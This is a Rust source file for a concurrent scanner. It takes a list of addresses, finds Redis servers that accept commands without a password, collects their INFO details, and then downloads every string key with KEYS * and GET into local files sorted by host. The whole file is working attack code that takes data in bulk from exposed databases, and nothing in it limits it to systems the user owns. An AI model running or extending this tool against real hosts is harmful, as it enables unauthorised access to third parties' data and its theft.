use std::env;
use std::io;
use std::net::SocketAddr;
use std::time::Duration;
use std::fs;
use std::path::PathBuf;
use std::io::Write;

use tokio::net::TcpSocket;
use tokio::time::timeout;

use futures::StreamExt;

use filenamify::filenamify;

use mkdirp;

extern crate redis;

async fn check_open(addr: SocketAddr, timeout_ms: u64) -> Option<SocketAddr> {
    let socket = TcpSocket::new_v4().unwrap();
    let connection = socket.connect(addr);
    if let Ok(res) = timeout(Duration::from_millis(timeout_ms), connection).await {
        match res {
            Ok(_) => Some(addr),
            Err(_) => None
        }
    } else {
        None
    }
}

async fn check_ping(addr: SocketAddr, timeout_ms: u64) -> Option<SocketAddr> {
    let addr_str = addr.to_string().to_owned();
    let conn_str = format!("redis://{}/", addr_str);

    match redis::Client::open(conn_str) {
        Ok(client) => {
            let connection = client.get_async_connection();
            if let Ok(res) = timeout(Duration::from_millis(timeout_ms), connection).await {
                match res {
                    Ok(mut conn) => {
                        if let Ok(cmd) = timeout(Duration::from_millis(timeout_ms), redis::cmd("PING").query_async(&mut conn)).await {
                            match cmd {
                                Ok::<String, _>(_) => {
                                    // println!("{:#?}", res);
                                    Some(addr)
                                },
                                Err(_) => None
                            }
                        } else {
                            println!("Command to {} timed out", addr);
                            None
                        }
                    },
                    Err(_) => None
                }
            } else {
                println!("Connection to {} timed out", addr);
                None
            }
        },
        Err(_) => None
    }
}

#[derive(Debug)]
struct RedisInfo {
    addr: SocketAddr,
    redis_version: String,
    redis_mode: String,
    arch_bits: u64,
    gcc_version: String,
    os: String,
    connected_clients: u64,
    role: String,
    connected_slaves: u64,
    pubsub_channels: u64,
    db0: String,
    db1: String,
}

async fn check_info(addr: SocketAddr) -> Option<RedisInfo> {
    let addr_str = addr.to_string().to_owned();
    let conn_str = format!("redis://{}/", addr_str);

    match redis::Client::open(conn_str) {
        Ok(client) => {
            match client.get_async_connection().await {
                Ok(mut conn) => {
                    match redis::cmd("INFO").query_async(&mut conn).await {
                        Ok::<redis::InfoDict, _>(res) => {
                            // println!("{:#?}", res);
                            let ri = RedisInfo {
                                addr,
                                redis_version: res.get("redis_version").unwrap(),
                                redis_mode: match res.get("redis_mode") {
                                    Some(v) => v,
                                    None => "unknown".to_string()
                                },
                                arch_bits: res.get("arch_bits").unwrap(),
                                gcc_version: match res.get("gcc_version") {
                                    Some(v) => v,
                                    None => "unknown".to_string()
                                },
                                os: match res.get("os") {
                                    Some(v) => v,
                                    None => "unknown".to_string()
                                },
                                connected_clients: res.get("connected_clients").unwrap(),
                                role: res.get("role").unwrap(),
                                connected_slaves: res.get("connected_slaves").unwrap(),
                                pubsub_channels: res.get("pubsub_channels").unwrap(),
                                db0: match res.get("db0") {
                                    Some(res) => res,
                                    None => "".to_string()
                                },
                                db1: match res.get("db1") {
                                    Some(res) => res,
                                    None => "".to_string()
                                },
                            };
                            Some(ri)
                        },
                        Err(_) => None
                    }
                },
                Err(_) => None
            }
        },
        Err(_) => None
    }
}

async fn dump_db(info: RedisInfo) {
    let addr_str = info.addr.to_string().to_owned();
    let conn_str = format!("redis://{}/", addr_str);
    let client = redis::Client::open(conn_str).unwrap();
    let mut conn = client.get_async_connection().await.unwrap();

    let key_spaces_str: String = match redis::cmd("INFO").arg("keyspace").query_async(&mut conn).await {
        Ok(v) => v,
        Err(_) => "".to_string()
    };

    if key_spaces_str == "" {
        println!("Skipping {} as no INFO command", info.addr);
        return
    }

    let key_spaces: Vec<&str> = key_spaces_str.split("\r\n").collect();
    let key_spaces: Vec<&str> = key_spaces.into_iter().filter(|s| s.starts_with("db")).collect();
    let key_spaces: Vec<u8> = key_spaces.into_iter().map(|s| {
        let db_name: Vec<&str> = s.split(":").collect();
        let mut db_name = db_name[0].to_string();
        db_name.remove(0);
        db_name.remove(0);
        // let db_name: Vec<&str> = db_name[0].split("db").collect();
        // db_name[0]
        let db_name: u8 = db_name.parse().unwrap();
        db_name
    }).collect();

    let mut path = PathBuf::new();
    path.push("./output");
    path.push(info.addr.to_string());

    for key_space in key_spaces {
        let mut key_dir = path.clone();
        key_dir.push(key_space.to_string());
        mkdirp::mkdirp(&key_dir).unwrap();

        let keys: Vec<String> = redis::cmd("KEYS").arg("*").query_async(&mut conn).await.unwrap();
        for key in &keys {
            // println!("{}: {}/{} => ???", info.addr, key_space, key);
            let mut file_path = key_dir.clone();

            let filename = match key.to_string().get(0..64) {
                Some(v) => v.to_string(),
                None => key.to_string(),
            };

            let safe_filename = filenamify(filename);
            file_path.push(safe_filename);
            file_path.set_extension("txt");

            // Check type of key, then try to get it
            let res: Vec<String> = redis::pipe().atomic()
                .cmd("SELECT").arg(key_space).ignore()
                .cmd("TYPE").arg(key).query_async(&mut conn).await.unwrap();
            let value: &str = &res[0];
            println!("{}: {}/{} => {}", info.addr, key_space, key, value);
            match value {
                "none" => {},
                "string" => {
                    let res: Vec<String> = redis::pipe().atomic()
                        .cmd("SELECT").arg(key_space).ignore()
                        .cmd("GET").arg(key).query_async(&mut conn).await.unwrap();
                    if res.len() > 0 {
                        let value = &res[0];
                        // println!("{}: {}/{} => {}", info.addr, key_space, key, value);

                        println!("{:?}", file_path);
                        let mut file = fs::File::create(&file_path).unwrap();
                        write!(&mut file, "{}", value).unwrap();
                        file.flush().unwrap();
                    }
                },
                _ => {},
            }
        }
    }
}

#[tokio::main]
async fn main() -> io::Result<()> {

    let concurrency_limit = 16;
    let dump_concurrency_limit = 4;
    let connection_timeout_ms = 10000;

    let args: Vec<String> = env::args().collect();
    println!("{:?}", args);

    if args.len() < 2 {
        println!("Missing filename with addresses as first argument");
        return Ok(())
    }

    let filename = &args[1];
    let contents = fs::read_to_string(filename).expect("couldnt read file");

    let addresses: Vec<&str> = contents.split("\n").collect();
    let addresses: Vec<&str> = addresses.into_iter().filter(|s| *s != "").collect();

    println!("### Hosts under test ({})", addresses.len());
    println!("{:#?}", addresses);

    // First check if we can connect to the socket
    let mut alive_hosts: Vec<SocketAddr> = vec!();
    let opens = futures::stream::iter(
        addresses.into_iter()
        .map(|addr| {
            let addr = addr.parse().unwrap();
            check_open(addr, connection_timeout_ms)
        })
    )
    .buffer_unordered(concurrency_limit)
    .map(|res| {
        match res {
            Some(addr) => {
                println!("{} was reachable", addr);
                alive_hosts.push(addr)
            },
            None => {}
        }
    })
    .collect::<Vec<_>>();
    opens.await;

    println!("### Alive hosts ({})", alive_hosts.len());
    // println!("{:#?}", alive_hosts);

    // Check which ones we can call PING on (unauthenticated)
    let mut unauthenticated_hosts: Vec<SocketAddr> = vec!();
    let opens = futures::stream::iter(
        alive_hosts.into_iter()
        .map(|addr| {
            check_ping(addr, connection_timeout_ms)
        })
    )
    .buffer_unordered(concurrency_limit)
    .map(|res| {
        match res {
            Some(addr) => {
                println!("{} was pingable", addr);
                unauthenticated_hosts.push(addr)
            },
            None => {}
        }
    })
    .collect::<Vec<_>>();
    opens.await;

    println!("### Unauthenticated hosts ({})", unauthenticated_hosts.len());

    let mut to_dump_hosts: Vec<RedisInfo> = vec!();

    // Check redis version
    let opens = futures::stream::iter(
        unauthenticated_hosts.into_iter()
        .map(|addr| {
            check_info(addr)
        })
    )
    .buffer_unordered(concurrency_limit)
    .map(|res| {
        match res {
            Some(info) => {
                println!("{:#?}", info);
                to_dump_hosts.push(info);
            },
            None => {}
        }
    })
    .collect::<Vec<_>>();
    opens.await;

    println!("### Hosts to dump from ({})", to_dump_hosts.len());
    // Dump contents from each instance to disk
    let opens = futures::stream::iter(
        to_dump_hosts.into_iter()
        .map(|info| {
            dump_db(info)
        })
    )
    .buffer_unordered(dump_concurrency_limit)
    .map(|()| {
        println!("Dumped to disk");
    })
    .collect::<Vec<_>>();
    opens.await;

    Ok(())
}
